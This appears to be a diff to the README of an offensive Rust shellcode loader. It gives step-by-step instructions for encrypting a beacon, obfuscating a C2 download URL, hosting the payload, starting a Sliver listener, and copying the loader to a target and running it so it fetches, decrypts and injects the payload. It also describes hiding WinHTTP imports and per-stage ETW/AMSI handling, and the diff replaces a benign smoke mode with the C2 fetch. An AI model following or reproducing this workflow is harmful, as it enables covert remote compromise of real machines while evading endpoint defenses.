@@ -44,29 +44,38 @@ python3 ../darkcrypt/tools/check_iocs.py artifacts/darkcrypt-rs.exe
    ```bash
    ../darkcrypt/forge.sh /tmp/beacon.bin
    ```
-   Writes `aes.encrypted` and prints the fresh keys. Paste them into `AES_KEY` / `MAC_KEY` in `src/main.rs`, then rebuild + re-gate.
-3. Open the listener:
+   Writes `aes.encrypted` and prints the fresh keys. Paste them into `AES_KEY` / `MAC_KEY` in `src/main.rs`.
+3. Re-bake `ENC_C2_URL` and `KEY_C2_URL` in `src/encoded_strings.rs` for your fetch URL via `tools/xor_encode.py --mb-key-random 6 "<url>"`. Then rebuild + re-gate.
+4. Host the blob and open the listener:
    ```
+   python3 -m http.server 8080 --directory .      # serves aes.encrypted at /aes.encrypted
    sliver > mtls -L 0.0.0.0 -l 8443
    ```
-4. Deliver + fire:
+5. Deliver + fire (no-arg run, loader fetches the hardcoded URL):
    ```bash
-   scp artifacts/darkcrypt-rs.exe   user@target:C:/Users/user/darkcrypt-rs.exe
-   scp aes.encrypted                user@target:C:/Users/user/dc_payload.bin
+   scp artifacts/darkcrypt-rs.exe user@target:C:/Users/user/darkcrypt-rs.exe
+   ssh user@target 'C:\Users\user\darkcrypt-rs.exe'
+   ```
+   `winhttp.dll` is loaded at runtime via hash-resolved `LoadLibraryW` and all eight `WinHttp*` entry points are resolved out of the shared DJB2 export cache, so the PE import table still lists only `KERNEL32.dll`.
+
+   Session lands on Sliver in ~1-2 seconds.
+
+   **Alternative — disk-based (scp the blob, pass the path):**
+   ```bash
+   scp aes.encrypted user@target:C:/Users/user/dc_payload.bin
    ssh user@target 'C:\Users\user\darkcrypt-rs.exe C:\Users\user\dc_payload.bin'
    ```
-   Session lands on Sliver in ~1-2 seconds.
 
 ## Modes
 
-- `darkcrypt-rs.exe` — benign smoke: 16-byte NOP+RET into notepad. Host not auto-cleaned.
-- `darkcrypt-rs.exe <path>` — combined: read + verify + decrypt + inject. Host left running for the operator.
+- `darkcrypt-rs.exe` — fetch `C2_URL` over WinHTTP, verify + decrypt + inject.
+- `darkcrypt-rs.exe <path>` — read from disk, verify + decrypt + inject.
 
 ## Exit codes
 
 ```
 0            PASS
-1-8          per-stage failure (peb init / halos init / etw / amsi / syscall smoke / read / decrypt / inject)
+1-9          per-stage failure (peb / halos / etw / amsi / syscall smoke / read / decrypt / inject / http)
 0xDEADBEEF   panic
 ```
 
